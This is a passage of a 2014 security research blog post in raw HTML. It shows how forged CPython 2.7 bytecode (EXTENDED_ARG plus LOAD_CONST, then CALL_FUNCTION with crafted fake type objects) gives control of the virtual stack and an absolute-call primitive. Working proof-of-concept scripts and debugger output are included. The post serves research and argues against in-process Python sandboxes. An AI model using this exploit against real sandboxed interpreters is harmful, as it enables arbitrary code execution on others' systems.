</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&#39;</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="c"># 20 is the offset of the array of byte we control in the string</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="c"># python27!PyEval_EvalFrameEx+0x347:</span>
</span><span class='line'><span class="c"># 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'><span class="n">high</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
</span><span class='line'><span class="n">low</span> <span class="o">=</span>  <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Consts tuple @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_consts</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Address of controled data @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_s</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Offset between const and our object: @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">offset</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Going to push [</span><span class="si">%#.8x</span><span class="s">] on the virtual stack&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address_consts</span> <span class="o">+</span> <span class="p">(</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">high</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">low</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..annnnd..</p>

<figure class='code'><figcaption><span>debugger view</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\&gt;python 1.py
</span><span class='line'>Consts tuple @0x01db1030
</span><span class='line'>Address of controled data @0x022a0654
</span><span class='line'>Offset between const and our object: @0x0013bd86
</span><span class='line'>Going to push [0x022a0654] on the virtual stack
</span><span class='line'>
</span><span class='line'>*JIT debugger pops*
</span><span class='line'>
</span><span class='line'>eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
</span><span class='line'>eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x34b:
</span><span class='line'>1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
</span><span class='line'>0:000&gt; ub eip l1
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
</span><span class='line'>0:000&gt; ? eax+edi*4+c
</span><span class='line'>Evaluate expression: 36308564 = 022a0654
</span><span class='line'>0:000&gt; dd 022a0654 l1
</span><span class='line'>022a0654  deadbeef &lt;- the data we control in our PyStringObject
</span><span class='line'>0:000&gt; dps 022a0654-0n20 l2
</span><span class='line'>022a0640  00000003
</span><span class='line'>022a0644  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, we control a part of the virtual stack :).</p>

<h2>Game over, LOAD_FUNCTION</h2>

<p>Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, push it onto the virtual stack and to use the magic opcode.</p>

<figure class='code'><figcaption><span>PyFunctionObject definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_globals</span><span class="p">;</span> <span class="cm">/* A dictionary (other mappings won&#39;t do) */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_defaults</span><span class="p">;</span>  <span class="cm">/* NULL or a tuple */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_closure</span><span class="p">;</span> <span class="cm">/* NULL or a tuple of cell objects */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_doc</span><span class="p">;</span>   <span class="cm">/* The __doc__ attribute, can be anything */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_name</span><span class="p">;</span>  <span class="cm">/* The __name__ attribute, a string object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_dict</span><span class="p">;</span>  <span class="cm">/* The __dict__ attribute, a dict or NULL */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_weakreflist</span><span class="p">;</span> <span class="cm">/* List of weak references */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_module</span><span class="p">;</span>  <span class="cm">/* The __module__ attribute, can be anything */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>

<p>Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let&rsquo;s go over the source code to illustrate my sayings:</p>

<figure class='code'><figcaption><span>CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="n">CALL_FUNCTION</span>:
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">sp</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PCALL</span><span class="p">(</span><span class="n">PCALL_ALL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sp</span> <span class="o">=</span> <span class="n">stack_pointer</span><span class="p">;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">call_function</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oparg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">na</span> <span class="o">=</span> <span class="n">oparg</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">nk</span> <span class="o">=</span> <span class="p">(</span><span class="n">oparg</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">na</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nk</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">pfunc</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">pp_stack</span><span class="p">)</span> <span class="o">-</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span> <span class="o">=</span> <span class="o">*</span><span class="n">pfunc</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">nk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..Nope..</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyMethod_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyMethod_GET_SELF</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">// ..Still Nope...</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span>
</span><span class='line'>      <span class="c1">// Nope!</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">do_call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">pp_stack</span><span class="p">,</span> <span class="n">na</span><span class="p">,</span> <span class="n">nk</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">do_call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">na</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nk</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Nope</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">callargs</span><span class="p">,</span> <span class="n">kwdict</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">PyObject_Call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">kw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">ternaryfunc</span> <span class="n">call</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">call</span> <span class="o">=</span> <span class="n">func</span><span class="o">-&gt;</span><span class="n">ob_type</span><span class="o">-&gt;</span><span class="n">tp_call</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// Yay an interesting call :)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">call</span><span class="p">)(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">kw</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>So basically the idea to use <em>CALL_FUNCTION</em> was a good one, but we will need to craft two different objects:</p>

<ol>
<li>The first one will be a <em>PyObject</em> with <em>ob_type</em> pointing to the second object</li>
<li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
</ol>


<p>This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>

<figure class='code'><figcaption><span>absolute call via CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">puint</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyStringObject_to_char_array_offset</span> <span class="o">=</span> <span class="mi">20</span>
</span><span class='line'><span class="n">second_object</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">second_object</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object_controled_data</span> <span class="o">=</span> <span class="n">addr_second_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_object</span> <span class="o">=</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_second_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_first_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">first_object</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_first_object_controled_data</span> <span class="o">=</span> <span class="n">addr_first_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_first_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span>  <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>     <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>    <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;CALL_FUNCTION&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we finally get our primitive working :&ndash;)</p>

<figure class='code'><figcaption><span>call 0xdeadbeef</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll -
</span><span class='line'>eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
</span><span class='line'>eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
</span><span class='line'>deadbeef ??              ???
</span></code></pre></td></tr></table></div></figure>


<p>So now you know all the nasty things going under the hood with that <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script!</p>

<h1>Conclusion, Ideas</h1>

<p>After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don&rsquo;t rely on such thing if you don&rsquo;t want to get surprised. An article about that exact same thing was written here if you are interested: <a href="https://lwn.net/Articles/574215/">The failure of pysandbox</a>.</p>

<p>You also may want to look at <a href="http://pypy.org/features.html#sandboxing">PyPy&rsquo;s sandboxing capability</a> if you are interested in executing untrusted Python code. Otherwise, you can build your own <a href="https://code.google.com/p/seccompsandbox/wiki/overview">SECCOMP</a>-based system :).</p>

<p>On the other hand, I had a lot of fun taking a deep dive into Python&rsquo;s source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:</p>

<ul>
<li><a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/">Debugging Your Python With GDB (FTW!)</a></li>
<li><a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">The structure of .pyc files</a></li>
<li><a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8">Bytecode: What, Why, and How to Hack it &ndash; Dr. Ryan F Kelly</a></li>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">Self-modifying Python bytecode</a></li>
<li><a href="http://eli.thegreenplace.net/category/programming/python/python-internals/">Python internals series</a></li>
</ul>


<p>Folks, that&rsquo;s all for today ; don&rsquo;t hesitate to contact us if you have a cool post!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Axel "0vercl0k" Souchet</span></span>

      








  


<time datetime="2014-04-17T23:22:00-07:00" pubdate data-updated="true">Apr 17<span>th</span>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/virtual-machine/'>virtual machine</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/" title="Previous Post: First dip into the kernel pool : MS10-058">&laquo; First dip into the kernel pool : MS10-058</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/04/30/corrupting-arm-evt/" title="Next Post: Corrupting the ARM Exception Vector Table">Corrupting the ARM Exception Vector Table &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2017/12/01/debugger-data-model/">Debugger data model, Javascript & x64 exception handling</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/08/05/binary-rewriting-with-syzygy/">Binary rewriting with syzygy, Pt. I</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/12/21/happy-unikernels/">happy unikernels</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/11/27/clang-and-passes/">Token capture via an llvm-based analysis pass</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/keygenning-with-klee/">Keygenning with KLEE</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 -  Axel Souchet, Jonathan Salwan, Jérémy Fetiveau <br/>
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> + <a href="https://github.com/ioveracker/mnml">mnml</a>.
	  
  </span>
</p>

</footer>
  












  <script type="text/javascript">
  jQuery(document).ready(function() {
    // Put a TOC right before the entry content.
    if(jQuery('div[id="tocBlock"]').length == 0)
        generateTOC('.entry-content-toc', null);
  });
  </script>

</body>
</html>
